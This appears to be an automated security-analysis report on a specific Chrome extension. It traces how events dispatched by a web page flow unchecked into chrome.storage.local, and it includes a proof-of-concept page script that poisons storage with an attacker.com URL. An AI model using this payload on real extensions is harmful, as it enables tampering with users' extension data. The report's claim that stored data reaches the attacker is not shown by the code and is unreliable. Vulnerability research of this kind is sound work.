# CoCo Analysis: cplclnpfdiaoffllhbcdgcbfegmnangp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (all chrome_storage_local_set_sink from same flow)

---

## Sink: document_eventListener_EventFromWebPage → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cplclnpfdiaoffllhbcdgcbfegmnangp/opgen_generated_files/cs_0.js
Line 764: `document.addEventListener('EventFromWebPage', function (e) {`
Line 767: `const type = e.detail.type;`
Line 784-787: Attacker-controlled fields: `e.detail.url`, `e.detail.path`, `e.detail.id`, `e.detail.monitoring_type`

All 4 detections trace the same vulnerability - different fields from the same event object flowing to storage.

**Code:**

```javascript
// Content script (cs_0.js) - Entry point: DOM event listener
document.addEventListener('EventFromWebPage', function (e) { // ← attacker-controlled
  console.log(e);
  const type = e.detail.type;
  switch (type) {
    case 'open':
      openNewPage(e) // ← passes attacker data
      break;
    case 'getEditData':
      getEditData(e)
      break;
  }
});

// Content script sends attacker data to background
function openNewPage (e) {
  var currentUrl = window.location.href;
  chrome.runtime.sendMessage(
    {
      type: 'openNewTab',
      url: e.detail.url,           // ← attacker-controlled
      path: e.detail.path,          // ← attacker-controlled
      id: e.detail.id,              // ← attacker-controlled
      monitoring_type: e.detail.monitoring_type, // ← attacker-controlled
      currentUrl: currentUrl
    },
    function (response) {
      console.log(response);
    }
  );
}

// Content script requests stored data back
function getEditData(e) {
  chrome.runtime.sendMessage(
    {
      type: 'getEditData',
      url: e.detail.url,
    },
    function (response) {
      console.log('getEditData', response); // ← attacker receives stored data
    }
  );
}

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  switch (request.type) {
    case 'openNewTab':
      handleOpenNewTab(request, sendResponse);
      break;
    case 'getEditData':
      handleGetEditData(sendResponse); // ← retrieves and sends data back
      break;
  }
});

// Background stores attacker data
function handleOpenNewTab (request, sendResponse) {
  getData(({ data, exists }) => {
    if (exists) {
      sendResponse({ data, exists }); // ← sends existing data back
      return;
    }
    chrome.tabs.create({ url: request.url }, (newTab) => {
      currentOpenObj = newTab
      currentUrl = request.currentUrl;
      currentOpenReq = request // ← stores attacker-controlled request
    });
    sendResponse({ data, exists });
  });
}

// Later, when tab initializes
function tabInitSelect (request, sendResponse) {
  if (!currentOpenObj.id) return
  chrome.tabs.sendMessage(currentOpenObj.id, {
    type: 'initSelect',
    url: currentOpenReq.url,
    path: currentOpenReq.path,
    monitoring_type: currentOpenReq.monitoring_type,
  }, () => {
    setStoredData(currentOpenReq); // ← stores attacker data to chrome.storage.local
  });
}

// Storage write
function setStoredData (data) {
  const newData = {};
  newData[storedDataKey] = data;
  chrome.storage.local.set(newData); // ← attacker-controlled data stored
}

// Storage read and retrieval
function getData (callback) {
  chrome.storage.local.get(storedDataKey, function (result) {
    const storedData = result[storedDataKey];
    const dataExists = storedData !== undefined && storedData !== null;
    callback({ data: storedData, exists: dataExists }); // ← returns stored data
  });
}

// Sends data back to content script (and thus to attacker)
function handleGetEditData (sendResponse) {
  getData(({ data, exists }) => {
    console.log('getEditData:', data, exists);
    sendResponse({ data, exists }); // ← sends to content script callback
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
      chrome.tabs.sendMessage(tabs[0].id, {
        type: 'getEditDataSucceed',
        data // ← sends poisoned data to content script
      });
    });
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener - malicious webpage can dispatch custom events

**Attack:**

```javascript
// Malicious webpage code
// Step 1: Poison storage with attacker-controlled data
const poisonEvent = new CustomEvent('EventFromWebPage', {
  detail: {
    type: 'open',
    url: 'https://attacker.com/malicious',
    path: '/admin/evil',
    id: 'attacker_id_12345',
    monitoring_type: 'malicious_monitor'
  }
});
document.dispatchEvent(poisonEvent);

// Wait for storage to be poisoned, then retrieve it back
setTimeout(() => {
  const retrieveEvent = new CustomEvent('EventFromWebPage', {
    detail: {
      type: 'getEditData',
      url: 'https://example.com'
    }
  });
  document.dispatchEvent(retrieveEvent);
}, 2000);

// The extension will call the callback with the poisoned data
// which the attacker can intercept by monitoring the response
```

**Impact:** Complete storage exploitation chain - attacker can poison chrome.storage.local with arbitrary monitoring configuration data (URLs, paths, IDs, monitoring types) and retrieve it back through the getEditData flow. The extension sends the poisoned data back to the content script via sendResponse and chrome.tabs.sendMessage, making it accessible to the attacker. This allows the attacker to manipulate the extension's monitoring behavior and exfiltrate stored configuration data.

---

## Note on Multiple Detections

CoCo detected 4 separate sinks for this vulnerability, but they all represent the same data flow - different fields (url, path, id, monitoring_type) from the same attacker-controlled event object (e.detail) flowing through the same code path to chrome.storage.local.set. All 4 detections constitute a single TRUE POSITIVE vulnerability with a complete exploitation chain.
